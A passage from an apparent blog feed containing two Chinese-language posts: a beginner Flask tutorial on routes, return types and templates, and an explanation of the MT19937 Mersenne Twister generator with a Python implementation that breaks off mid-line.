class="string">&quot;/get&quot;</span>,methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这是一个get请求&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/post&quot;</span>,methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">post_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;这是一个post请求&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902230653213.png" alt="image-20250902230653213"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902231047893.png" alt="image-20250902231047893"></p><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902232053306.png" alt="image-20250902232053306"></p><h2 id="视图函数返回">视图函数返回</h2><p>视图函数的返回可以返回<code>字符串、html、标签、json文件、自定义请求响应</code>，这里直接从例子入手。</p><ul><li>例子1：返回<code>json</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/json&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">json_func</span>():</span><br><span class="line">    dicts=<span class="built_in">dict</span>()</span><br><span class="line">    dicts[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;tome&quot;</span></span><br><span class="line">    dicts[<span class="string">&quot;age&quot;</span>] = <span class="number">19</span></span><br><span class="line">    <span class="keyword">return</span> flask.jsonify(dicts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902233706687.png" alt="image-20250902233706687"></p><ul><li>例子2：返回<code>字符串</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/str&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;strs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902233815127.png" alt="image-20250902233815127"></p><ul><li>例子3：返回<code>html</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">html_func</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;h1&gt;html&lt;/h1&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902233914436.png" alt="image-20250902233914436"></p><ul><li>例子4：返回自定义请求</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/response&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">response_func</span>():</span><br><span class="line">    response=flask.Response(<span class="string">&quot;defi response&quot;</span>,status=<span class="number">200</span>)</span><br><span class="line">    response.headers[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&quot;definiresponse&quot;</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902234501110.png" alt="image-20250902234501110"></p><h2 id="静态文件与模版">静态文件与模版</h2><ul><li><p>静态文件和模版：管理静态文件和动态渲染HTML模版。例如：<code>.html、.png、.jpg</code>文件</p></li><li><p>这个其实也是路由函数的一种返回类型，是直接返回文件。需要使用<code>flask</code>中的<code>flask.render_template()</code>函数，使用<code>flask.render_template()</code>，该函数会从当前目录下的一个名为<code>templates</code>的目录作为根目录去寻找对应的文件。</p></li></ul><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902235026791.png" alt="image-20250902235026791"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/return_html&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">return_html_func</span>():</span><br><span class="line">    <span class="keyword">return</span> flask.render_template(<span class="string">&#x27;./example.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902235038747.png" alt="image-20250902235038747"></p><h2 id="路由优先级">路由优先级</h2><ul><li>当存在两个相同的路由时，使用<code>URL</code>访问路由函数时，到底是先调用哪个路由函数，这个就需要使用路由优先级确定。</li><li>路由优先级原则：哪个路由函数先被定义，先被定义的路由函数优先级就会更高。访问该路径的时候，使用的路由函数始终是<code>func1</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask <span class="comment"># 也可以使用 from flask import *,但是这样导入可能会造成函数名称污染</span></span><br><span class="line">app = flask.Flask(__name__) <span class="comment"># 创建一个Flask对象</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/my_route&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Func1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/my_route&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Func2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run() <span class="comment"># 还可以app.run(&quot;ip&quot;,post)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/09/02/%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97/Python_flask%E6%A1%86%E6%9E%B6/Python-flask%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%911/image-20250902235353791.png" alt="image-20250902235353791"></p><h1 id="flask视图函数">flask视图函数</h1><ul><li>视图函数其实就是与<code>flask</code>路由绑定起来的函数，该函数被称为视图函数。视图函数一般最经常用来处理前端发送过来的请求，后端的逻辑一般都在<code>flask</code>视图函数中编写。</li><li>对于<code>flask</code>视图函数，主要就是前后端交互的处理，一般就是接收和处理前端发送过来的数据，然后将处理结果返回给前端，从而达到前后端交互目的。</li></ul><h2 id="获取请求数据">获取请求数据</h2><h2 id="返回响应">返回响应</h2><h2 id="处理请求相应">处理请求相应</h2><h2 id="处理错误">处理错误</h2><h2 id="视图函数装饰器">视图函数装饰器</h2><ul><li><p>函数装饰器是<code>python</code>的一个特性，而<code>flask</code>框架有一些定义好的函数装饰器，接下来就是要学习<code>flask</code>框架的视图函数装饰器。</p></li><li><p>对于视图函数修饰器，效果有点类似于<code>@app.route</code>这个功能，<code>route</code>是对视图函数将URL进行绑定。而视图函数修饰器也类似于用来绑定函数的。接下来介绍几个修饰器的关键字，用户还可以<strong>自定义视图函数修饰器</strong>：</p><ul><li>路由相关：<ul><li><code>@app.get('/path')</code>：相当于<code>@app.route('/path', methods=['GET'])</code>，只响应<code>GET</code>请求</li><li><code>@app.post('/path')</code>：相当于<code>@app.route('/path', methods=['POST'])</code>，只响应<code>post</code>请求</li><li><code>@app.put('/path')</code> 、<code>@app.delete('/path')</code> 、 <code>@app.patch('/path')</code>：<br>分别对应 PUT、DELETE、PATCH 请求。</li><li><code>@app.route('/path',methods=['GET','POST'])</code>：可以处理多个请求。</li></ul></li><li>请求钩子：<ul><li><code>@app.before_request</code>：在每个请求之前运行的函数。</li><li><code>@app.after_request</code>：在每个请求处理之后的函数</li><li><code>@app.teardown_request</code>：在请求结束之后运行的函数，用于清理工作</li></ul></li><li>错误处理修饰器：<ul><li><code>@app.errorhandler(404)</code>：捕获404错误，返回自定义页面</li><li><code>@app.errorhandler(Exception)</code>：捕获所有异常，可返回统一的错误信息</li></ul></li><li>蓝图相关修饰器：<ul><li><code>@bp.route('/path')</code>：类似于<code>@app.route('/path')</code>，但是只作用于蓝图</li><li><code>@bp.before_app_request</code>：只作用于蓝图的钩子函数。</li></ul></li></ul></li></ul><h1 id="flask模版渲染">flask模版渲染</h1><ul><li>在web开发中，模版一般是指带有占位符的<code>HTML</code>文件，这样其实就能根据一些用户信息或者用户的请求在前端显示不同的信息。</li></ul><h1 id="项目1登录界面">项目1—登录界面</h1><h2 id="阶段1">阶段1</h2><h2 id="阶段2">阶段2</h2><h2 id="阶段3">阶段3</h2>]]></content>
    
    
    <summary type="html">前言：5天时间内要完成一个课设，还是赶紧学吧。</summary>
    
    
    
    <category term="开发" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/"/>
    
    <category term="后端" scheme="http://iyheart.github.io/categories/%E5%BC%80%E5%8F%91/%E5%90%8E%E7%AB%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>伪随机数生成器MT19937</title>
    <link href="http://iyheart.github.io/2025/09/02/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/MT19937%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/"/>
    <id>http://iyheart.github.io/2025/09/02/CTFblog/CRYPTO%E7%B3%BB%E5%88%97blog/%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81%E4%B9%8B%E4%B8%BA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/MT19937%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%99%A8/</id>
    <published>2025-09-02T00:04:49.000Z</published>
    <updated>2025-10-20T01:18:43.103Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>做到相关的题目就直接来先学习一下。</p></li><li><p>参考博客：<a href="https://seandictionary.top/mt19937/">https://seandictionary.top/mt19937/</a></p></li><li><p>参考文章：<a href="https://en.wikipedia.org/wiki/Mersenne_Twister">Mersenne Twister - Wikipedia</a></p></li><li><p>参考博客：<a href="https://hasegawaazusa.github.io/mersenne-twister-note.html">https://hasegawaazusa.github.io/mersenne-twister-note.html</a></p></li><li><p>参考博客：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">https://huangx607087.online/2021/07/10/Explore-MT19937/</a></p></li><li><p>参考博客：<a href="https://xenny.wiki/posts/crypto/PRNG/MT19937.html">MT19937 分析 | Xenny 的博客</a>，<code>Xenny</code>老师这篇讲如何逆向MT19937讲的挺好的。</p></li></ul><p>MT19937 即梅森旋转算法（Mersenne twister）由松本眞（日语：松本真）和西村拓士在 1997 年开发，基于二进制有限域 $\mathbb{F}_2$​上的矩阵线性递归，可以快速产生高质量的伪随机数。</p><p>该算法的周期为$2^{19937}−1$，故名为 MT19937。该算法具有以下优点</p><ul><li>周期非常长，达到$2^{19937}−1$。</li><li>在$1≤k≤623$都满足$k-$分布。</li><li>能比硬件实现的方法更快产生伪随机数。</li></ul><blockquote><p>$k-$分布：一个周期为$P$的$\omega$位整数的伪随机序列$x_i$，如果下列成立则称$v-$比特精度的$k-$分布成立：</p><p>令$trunc_v(x)$表示由$x$的前$v$位形成的数，考虑$P$中$k$个$v$向量，然后$2^{kv}$个组合中每一个都在一个周期内出现次数相同（全0组合次数较少除外）。<br>$$<br>(trunc_v(x_i),trunc_v(x_{i+1}),…,trunc_v(x_{i+k-1}))~(0≤i＜P)<br>$$</p></blockquote><h1 id="mt19937">MT19937</h1><ul><li><p>对于<code>MT19937</code>的介绍，已经在前面的一篇文章中介绍过了，接下来就具体学习一下<code>MT19937</code>具体的算法过程。这里简单讲一下前面没讲的：</p><ul><li><p>对于<code>MT19937</code>的应用，其实很多语言的<code>random</code>这个库都使用的是<code>MT19937</code>这个算法，比如<code>python</code>、<code>PHP</code>和<code>Matlab</code>，并且从<code>C++11</code>开始，<code>C++</code>也可以使用梅森旋转算法（MT19937）,对应的命名空间为<code>std::mt19937_64</code>。</p></li><li><p><code>MT19937</code>这个伪随机数生成器，目前被视为最好的随机数算法。</p></li><li><p>做个统一：以下文章中的内容都以<code>MT19937</code>来表示该算法。</p></li><li><p>该版本其实就是使用<code>32</code>位的整数作为该算法的种子。之后的<code>64</code>位是后来的一个变种版本，初学的时候一开始只要学原始版本即可。</p></li><li><p>注意：自己写好的<code>MT19937</code>算法代码不要使用Python的<code>random</code>库验证，因为使用Python自带的<code>random</code>库传入<code>seed</code>的时候可能还会对<code>seed</code>做一些处理。</p></li></ul></li><li><p>接下来我们一步一步介绍一下<code>MT19937</code>的具体过程，采用的是该博客的方式：<a href="https://hasegawaazusa.github.io/mersenne-twister-note.html%EF%BC%8C%E5%85%88%E5%88%86%E5%B8%83%E4%BB%8B%E7%BB%8D%EF%BC%8C%E6%9C%80%E5%90%8E%E5%86%8D%E5%B0%86%E7%AE%97%E6%B3%95%E6%9C%89%E4%B8%AA%E6%95%B4%E4%BD%93%E6%A6%82%E5%BF%B5%E3%80%82">https://hasegawaazusa.github.io/mersenne-twister-note.html，先分布介绍，最后再将算法有个整体概念。</a></p></li><li><p>代码采用的是这篇博客的代码，实现的比较简洁：<a href="https://huangx607087.online/2021/07/10/Explore-MT19937/">https://huangx607087.online/2021/07/10/Explore-MT19937/</a></p></li><li><p>这个算法其实总的来说有三个部分，分别就是<code>初始化操作</code>、<code>获得伪随机数(提取伪随机数)</code>、<code>梅森旋转操作</code></p></li></ul><h2 id="初始化">初始化</h2><p>代码如下，这里主要就是利用用户传入的种子，对该<code>MT19937</code>中的初始状态寄存器做一个初始化操作，使得<code>624</code>个初始化状态寄存器都有对应的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于Python中支持无限长度的整型,所以我们需要定义一个函数来实现32位整型的提取</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span> &amp; x</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个MT19937的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        先对数据进行初始化操作,并且定义一些固定的值以及用户传进来的值</span></span><br><span class="line"><span class="string">        1.mt:表示624个初始状态的寄存器,这里使用长度为624的列表表示</span></span><br><span class="line"><span class="string">        2.seed:表示用户传入的随机数种子,并将该种子赋值给mt[0],即第一个寄存器</span></span><br><span class="line"><span class="string">        3.mtinit: 是用于初始化的一个常数,该数可以用于提高初始种子的扩散效果</span></span><br><span class="line"><span class="string">        4.mti:这里先设定一个初值0,在初始化的时候用不到</span></span><br><span class="line"><span class="string">        5.最后进行623次的for循环,通过递推的方式为每一个初始状态寄存器都进行初始化</span></span><br><span class="line"><span class="string">        (也就是说初始状态寄存器的值与seed关联性是比较强的)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.mt = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti=<span class="number">0</span></span><br><span class="line">        self.mtinit = <span class="number">0x6c078965</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(self.mtinit * (self.mt[i-<span class="number">1</span>] ^ self.mt[i-<span class="number">1</span>] &gt;&gt; <span class="number">30</span>) + i)</span><br></pre></td></tr></table></figure><h2 id="提取伪随机数">提取伪随机数</h2><ul><li>代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">getrandbits</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    1.这个步骤就是利用之前生成的624个初始状态寄存器的值,通过梅森旋转以及位运算</span></span><br><span class="line"><span class="string">      从而计算出这一次触发时我们得到的伪随机数的值</span></span><br><span class="line"><span class="string">    2.mti其实这里就是记录用户获取随机数的此时,以624为一个周期,每获取一个周期后就会触发梅森旋转(也被称为回火策略)</span></span><br><span class="line"><span class="string">    3.一开始mti为0的时候就会先触发一次梅森旋转</span></span><br><span class="line"><span class="string">    4. 2636928640(即0x9D2C5680)和4022730752(即0xEFC60000)都是常量。前者混合中位，掩盖模式特征;后者混合高位，增强熵</span></span><br><span class="line"><span class="string">    5. 这些常数保证了输出的质量和周期长度,并不能随意修改</span></span><br><span class="line"><span class="string">    :return: 返回值就是一个32位的整数</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> self.mti &gt;= <span class="number">624</span>:</span><br><span class="line">        self.twist()</span><br><span class="line">    y = self.mt[self.mti]</span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">11</span>)</span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">7</span>) &amp; <span class="number">0x9D2C5680</span></span><br><span class="line">    y ^= (y &lt;&lt; <span class="number">15</span>) &amp; <span class="number">0xEFC60000</span></span><br><span class="line">    y ^= (y &gt;&gt; <span class="number">18</span>)</span><br><span class="line">    self.mti = (self.mti + <span class="number">1</span>) % <span class="number">624</span></span><br><span class="line">    <span class="keyword">return</span> _int32(y)</span><br></pre></td></tr></table></figure><h2 id="状态旋转">状态旋转</h2><ul><li>代码如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">twist</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    直接将624个初始状态寄存器进行一个梅森旋转操作，</span></span><br><span class="line"><span class="string">    旋转过程涉及位运算以及与当前初始状态寄存器i以及第i+397个寄存器的状态有关</span></span><br><span class="line"><span class="string">    :return: 无返回值</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">624</span>):</span><br><span class="line">        <span class="comment"># 主要就是与一个固定的0x80000000 和 0x7fffffff</span></span><br><span class="line">        <span class="comment"># 这里就表示用第i个初始状态寄存器的最高位 + 第i+1个初始状态寄存器的第1-31位</span></span><br><span class="line">        y = _int32(((self.mt[i]) &amp; <span class="number">0x80000000</span>) + (self.mt[(i + <span class="number">1</span>) % <span class="number">624</span>] &amp; <span class="number">0x7fffffff</span>))</span><br><span class="line">        <span class="comment"># 之后就是更新当前初始状态寄存器的的值</span></span><br><span class="line">        self.mt[i] = _int32((y &gt;&gt; <span class="number">1</span>) ^ self.mt[(i+<span class="number">397</span>) % <span class="number">624</span>])</span><br><span class="line">        <span class="keyword">if</span> y % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            self.mt[i] = self.mt[i] ^ <span class="number">0x9908b0df</span></span><br><span class="line">    self.mti = <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="总体代码">总体代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_int32</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="number">0xFFFFFFFF</span> &amp; x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一个MT19937的类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MT19937</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,seed</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        先对数据进行初始化操作,并且定义一些固定的值以及用户传进来的值</span></span><br><span class="line"><span class="string">        1.mt:表示624个初始状态的寄存器,这里使用长度为624的列表表示</span></span><br><span class="line"><span class="string">        2.seed:表示用户传入的随机数种子,并将该种子赋值给mt[0],即第一个寄存器</span></span><br><span class="line"><span class="string">        3.mtinit: 是用于初始化的一个常数,该数可以用于提高初始种子的扩散效果</span></span><br><span class="line"><span class="string">        4.mti:这里先设定一个初值0,在初始化的时候用不到,</span></span><br><span class="line"><span class="string">        5.最后进行623次的for循环,通过递推的方式为每一个初始状态寄存器都进行初始化</span></span><br><span class="line"><span class="string">        (也就是说初始状态寄存器的值与seed关联性是比较强的)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self.mt = [<span class="number">0</span>]*<span class="number">624</span></span><br><span class="line">        self.mt[<span class="number">0</span>] = seed</span><br><span class="line">        self.mti=<span class="number">624</span></span><br><span class="line">        self.mtinit = <span class="number">0x6c078965</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">624</span>):</span><br><span class="line">            self.mt[i] = _int32(self.mtinit * 